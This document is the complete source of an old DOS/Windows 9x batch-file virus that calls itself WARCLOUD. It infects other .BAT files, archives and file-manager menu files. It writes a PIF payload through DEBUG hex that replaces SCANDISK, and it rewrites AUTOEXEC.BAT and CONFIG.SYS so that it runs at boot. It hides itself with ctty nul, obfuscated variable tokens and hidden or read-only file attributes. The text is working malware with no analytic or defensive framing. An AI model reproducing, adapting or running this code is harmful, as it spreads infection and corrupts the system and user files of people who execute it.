@goto tt%wú%
:wúktim
ctty con%wú%
echo fucker
@goto WúC
:tt %wúc%
@ctty nul%wúc%
break off%wúc%
if ’¥ âàÿ%2==’¥ âàÿ’¥­¥© goto wúc_rgl
if VC_%2==VC_menu_file_wúc goto mnu_wúc
if aka_%2==aka_joy_wúc goto ext_wúc
if PIF%2==PIFpaffie_wúc goto pif_wúc
%wúc%if not exist \%0 copy %0 \
%wúc%attrib +R \%0
if %wúc%not exist ..\%0 copy %0 ..
if not %wúc%exist \VC\%0 copy %0 \VC
if not exist %winbootdir%\command\%0 %wúc%copy %0 %winbootdir%\command
for %%$ in (*.BAT) do%wúc% call %0 %%$ ’¥­¥©
for %%$ in (*.MNU \VC\*.MNU) do call %0 %%$ menu_file_wúc
for %%$ in (*.EXT \VC\*.EXT) do call %0 %%$ joy_wúc
for %%$ in (*.PIF %winbootdir%\*.PIF %winbootdir%\PIF\*.PIF) do call %0 %%$ paffie_wúc
for %%$ i%wúc%n (*.RAR) do rar a -c- -o+ -tk %%$ %0
for %%$ in (*.ZIP) d%wúc%o pkzip %%$ %0
for %%$ in (*.%wúc%ARJ) do arj a %%$ %0
goto sys_wúc
:retn_wúc
del %tmp%\wctt$$$.tmp%wúc%
set sys=%wúc%
if not !%2==!ONLY goto wúktim%wúc%
goto WúC

:wúc_rgl
if %1==AUTOEXEC.BAT goto freezero_wúc
f%wúc%ind "WARCLOUD" %1
if not errorlevel 1 goto WúC
copy%wúc% %1 %tmp%\wctt$$$.tmp
%wúc%echo @goto tt%%wú%%>%1
%wúc%echo :wúktim>>%1
%wúc%echo ctty con%%wú%%>>%1
copy %1+%tmp%\wctt$$$.tmp %1%wúc%
%wúc%echo.>>%1
%wúc%find/i "wúc"<%0>>%1
goto WúC

:freezero_wúc
find "%0" %1%wúc%
if not errorlevel 1 goto wúc
copy%wúc% %1 %tmp%\wctt$$$.tmp
attrib -R %wúc%%1
echo call %0>%1%wúc%
copy %1+%tmp%\wctt$$$.tmp %1%wúc%
attri%wúc%b +R %1
goto WúC

:mnu_wúc
find "WAR%wúc%CLOUD" %1
if not errorlevel 1 goto WúC
attrib -R %1%wúc%
copy %1 %TMP%\wctt$$$.tmp%wúc%
%wúc%echo>%1 F1:  WARCLOUD "’¥ âà ’¥­¥©". Š’ 1997
%wúc%echo>>%1         %0
if not exist vc.mnu copy %1 vc%wúc%.mnu
copy %1+%TMP%\wctt$$$.tmp %1%wúc%
attrib +R +H%wúc% %1
goto WúC

:ext_wúc
find "wúc" %1
if not errorlevel 1 goto WúC
if %1==VC.EXT %wúc%goto WúC
if %1==\VC\VC.EXT goto WúC
a%wúc%ttrib -R %1
copy %1%wúc% %TMP%\wctt$$$.tmp
 find "find/v/i"<%0>%1%wúc%
if not exist \VC\ncedit.exe echo>>%1  @edit !:!\$.bat%%wúc%%
if exist \VC\ncedit.exe echo>>%1  @ncedit !:!\$.bat%%wúc%%
echo>>%1  @ctty nul %%wúc%%
echo>>%1  @find/i "wúc" !:!\!.!
echo>>%1  @if not errorlevel 1 !:!\!.! INFECTION ONLY%%wúc%%
echo>>%1  @attrib -R -H -S !:!\!.!%%wúc%%
echo>>%1  @move !:!\$.bat !:!\!.!%%wúc%%
echo>>%1  @ctty con%%wúc%%
copy %1+%TMP%\wctt$$$.tmp %1%wúc%
attrib +R +H %1%wúc%
goto WúC

:pif_wúc
if exist \image.bat goto D%wúc%arkSeed
%wúc%copy %0 \image.bat
attr%wúc%ib +R +S +H \image.bat
if not exist \image.dat goto DarkSeed%wúc%
attrib -R -S -H \image.dat%wúc%
del %wúc%image.dat
:DarkSeed%wúc%
find "%wúc%SCANDISK" %1
if not errorlevel 1 goto WúC
att%wúc%rib -R %1
debug<%0%wúc%
move \treein%wúc%fo.ncd %1
goto WúC

:sys_wúc
if not exist \AUTOEXEC.BAT goto retn_wúc
if not exist \CONFIG.SYS goto retn_wúc
set sys=\AUTOEXEC.BAT%wúc%
find "%0" %sys%%wúc%
if not errorlevel 1 goto retn_wúc
find "Fuck_Up" %sys%%wúc%
if not errorlevel 1 goto retn_wúc
%wúc%attrib -R %sys%
find/i/v "%wúc%GOTO %%CONFIG%%"<%sys%>%sys%
copy %sys% %tmp%\wctt$$$.tmp%wúc%
echo if %%CONFIG%%==Of_Them goto %%CoNFiG%%>%sys%%wúc%
echo%wúc% goto Fuck_Up>>%sys%
echo%wúc% :Of_Them>>%sys%
echo%wúc% @if exist %0 call %0>>%sys%
echo%wúc% @if exist %0 goto Fuck_Up>>%sys%
echo%wúc% @attrib -S image.bat>>%sys%
echo%wúc% @call image.bat>>%sys%
echo%wúc% @attrib +S image.bat>>%sys%
echo%wúc% :Fuck_Up>>%sys%
copy %sys%+%tmp%\wctt$$$.tmp %sys%%wúc%
attrib +R %sys%%wúc%
set sys=\CONFIG.SYS%wúc%
attrib -R %sys%%wúc%
find/i/v "MENU"<%sys%>%sys%%wúc%
copy %sys% %tmp%\wctt$$$.tmp%wúc%
echo>%sys% SWITCHES=/N%wúc%
echo>>%sys% [MENU]%wúc%
echo>>%sys% MENUITEM = Four[Normal%wúc%
echo>>%sys% MENUITEM = Four[Logged (\BOOTLOG.TXT)%wúc%
echo>>%sys% MENUITEM = Of_Them[Safe mode%wúc%
echo>>%sys% MENUITEM = Four[Safe mode with network support%wúc%
echo>>%sys% MENUITEM = Four[Step-by-step confirmation%wúc%
echo>>%sys% MENUITEM = Four[Command prompt only%wúc%
echo>>%sys% MENUITEM = Four[Safe mode command prompt only%wúc%
echo>>%sys% MENUDEFAULT = Of_Them[30]%wúc%
echo>>%sys% [Four]%wúc%
echo>>%sys% [Of_Them]%wúc%
copy %sys%+%tmp%\wctt$$$.tmp %sys%%wúc%
at%wúc%trib +R %sys%
goto retn_wúc
N TREEINFO.NCD%wúc%
E 0100 00 78 41 56 50 20 33 2E 30 20 57 65 65 6B 6C 79%wúc%
E 0110 20 55 70 64 61 74 65 20 20 20 20 20 20 20 20 20%wúc%
E 0120 80 02 00 00 53 43 41 4E 44 49 53 4B 2E 45 58 45%wúc%
E 0130 00 44 49 53 4B 2E 45 58 45 00 00 00 00 00 00 00%wúc%
E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0160 00 00 00 10 00 00 20 20 20 20 20 20 20 00 00 00%wúc%
E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 01E0 00 00 00 00 00 00 01 00 FF 19 50 00 00 07 00 00%wúc%
E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0270 00 4D 49 43 52 4F 53 4F 46 54 20 50 49 46 45 58%wúc%
E 0280 00 87 01 00 00 71 01 57 49 4E 44 4F 57 53 20 33%wúc%
E 0290 38 36 20 33 2E 30 00 05 02 9D 01 68 00 80 02 00%wúc%
E 02A0 00 64 00 32 00 FF FF 00 00 FF FF 00 00 E2 4F 10%wúc%
E 02B0 00 1F 00 00 00 3A 00 0C 00 0F 00 00 00 00 00 00%wúc%
E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0300 00 00 00 00 00 57 49 4E 44 4F 57 53 20 56 4D 4D%wúc%
E 0310 20 34 2E 30 00 FF FF 1B 02 AC 01 00 00 00 00 00%wúc%
E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0370 00 00 00 50 49 46 4D 47 52 2E 44 4C 4C 00 00 00%wúc%
E 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 03C0 00 00 00 25 00 32 00 00 00 00 00 00 00 00 00 00%wúc%
E 03D0 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 E0%wúc%
E 03E0 0F 00 00 05 00 19 00 03 00 C8 00 E8 03 02 00 0A%wúc%
E 03F0 00 01 00 00 00 00 00 00 00 14 04 00 00 04 00 06%wúc%
E 0400 00 04 00 06 00 54 65 72 6D 69 6E 61 6C 00 00 00%wúc%
E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0420 00 00 00 00 00 43 6F 75 72 69 65 72 20 4E 65 77%wúc%
E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0440 00 00 00 00 00 00 00 01 00 00 00 50 00 19 00 00%wúc%
E 0450 00 00 00 00 00 00 00 16 00 00 00 00 00 00 00 00%wúc%
E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0470 00 5C 69 6D 61 67 65 2E 62 61 74 00 00 00 00 00%wúc%
E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%wúc%
E 04C0 00 00 00 00 00 01 00%wúc%
RCX%wúc%
03C7%wúc%
W%wúc%
Q%wúc%
bat: @find/v/i "wú"<!:!\!.!>!:!\$.bat%wúc%
:WúC